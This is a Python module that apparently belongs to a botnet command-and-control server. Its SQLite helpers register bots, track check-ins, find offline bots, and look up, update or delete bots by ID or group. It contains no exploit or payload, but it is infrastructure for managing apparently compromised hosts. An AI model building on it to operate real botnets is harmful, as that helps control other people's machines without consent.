# server/bot_manager.py
"""
Bot Manager Module

Handles bot lifecycle management including registration, status updates,
and offline detection.

IMPORTANT: Bot registration happens in server/app.py /checkin endpoint.
This module provides utility functions for bot management.
"""

from .config import Config
import sqlite3
import logging
from datetime import datetime, timedelta

logging.basicConfig(level=logging.INFO)

def register_bot(bot_ip, bot_os, group, public_key):
    """
    Register a bot in the database with context manager.
    
    NOTE: This function is not currently used as bot registration
    happens directly in app.py /checkin endpoint with full validation.
    
    Args:
        bot_ip (str): IP address of the bot
        bot_os (str): Operating system of the bot
        group (str): Bot group/category
        public_key (str): ECDH public key in PEM format
    """
    try:
        with sqlite3.connect(Config.DB_NAME) as conn:
            c = conn.cursor()
            c.execute(
                """INSERT INTO bots (ip, os, last_seen, group_name, public_key) 
                   VALUES (?, ?, ?, ?, ?)""",
                (bot_ip, bot_os, datetime.now().isoformat(), group, public_key)
            )
            conn.commit()
            logging.info(f"Bot registered: {bot_ip} [{bot_os}] in group '{group}'")
    except sqlite3.IntegrityError as e:
        logging.warning(f"Bot registration integrity error (duplicate?): {e}")
    except Exception as e:
        logging.error(f"Error registering bot: {e}")

def get_offline_bots(timeout_minutes=30):
    """
    Get list of bots that haven't checked in recently.
    
    Args:
        timeout_minutes (int): Threshold for offline status
        
    Returns:
        list: Tuples of (bot_id, ip, last_seen, minutes_offline)
    """
    try:
        threshold = datetime.now() - timedelta(minutes=timeout_minutes)
        
        with sqlite3.connect(Config.DB_NAME) as conn:
            c = conn.cursor()
            c.execute(
                """SELECT id, ip, last_seen FROM bots 
                   WHERE datetime(last_seen) < ?
                   ORDER BY last_seen DESC""",
                (threshold.isoformat(),)
            )
            offline_bots = c.fetchall()
        
        return offline_bots if offline_bots else []
    except Exception as e:
        logging.error(f"Error getting offline bots: {e}")
        return []

def get_bot_by_id(bot_id):
    """
    Retrieve bot information by ID.
    
    Args:
        bot_id (int): Bot ID to retrieve
        
    Returns:
        dict: Bot information or None if not found
    """
    try:
        with sqlite3.connect(Config.DB_NAME) as conn:
            c = conn.cursor()
            c.execute(
                """SELECT id, ip, os, last_seen, group_name, public_key 
                   FROM bots WHERE id=?""",
                (bot_id,)
            )
            bot = c.fetchone()
        
        if bot:
            return {
                "id": bot[0],
                "ip": bot[1],
                "os": bot[2],
                "last_seen": bot[3],
                "group_name": bot[4],
                "public_key": bot[5]
            }
        return None
    except Exception as e:
        logging.error(f"Error retrieving bot {bot_id}: {e}")
        return None

def get_bots_by_group(group_name):
    """
    Get all bots in a specific group.
    
    Args:
        group_name (str): Group to filter by
        
    Returns:
        list: List of bot dictionaries
    """
    try:
        with sqlite3.connect(Config.DB_NAME) as conn:
            c = conn.cursor()
            c.execute(
                """SELECT id, ip, os, last_seen, group_name 
                   FROM bots WHERE group_name=? ORDER BY last_seen DESC""",
                (group_name,)
            )
            bots = c.fetchall()
        
        return [
            {
                "id": bot[0],
                "ip": bot[1],
                "os": bot[2],
                "last_seen": bot[3],
                "group_name": bot[4]
            }
            for bot in bots
        ]
    except Exception as e:
        logging.error(f"Error retrieving bots for group {group_name}: {e}")
        return []

def update_bot_status(bot_id, status):
    """
    Update bot status in database.
    
    Args:
        bot_id (int): Bot ID
        status (str): Status string (online, offline, compromised, etc.)
        
    Returns:
        bool: True if successful, False otherwise
    """
    try:
        with sqlite3.connect(Config.DB_NAME) as conn:
            c = conn.cursor()
            c.execute(
                "UPDATE bots SET last_seen=? WHERE id=?",
                (datetime.now().isoformat(), bot_id)
            )
            conn.commit()
        return True
    except Exception as e:
        logging.error(f"Error updating bot status: {e}")
        return False

def delete_bot(bot_id):
    """
    Delete a bot from the database.
    
    Args:
        bot_id (int): Bot ID to delete
        
    Returns:
        bool: True if successful, False otherwise
    """
    try:
        with sqlite3.connect(Config.DB_NAME) as conn:
            c = conn.cursor()
            c.execute("DELETE FROM bots WHERE id=?", (bot_id,))
            conn.commit()
        logging.info(f"Bot {bot_id} deleted")
        return True
    except Exception as e:
        logging.error(f"Error deleting bot: {e}")
        return False

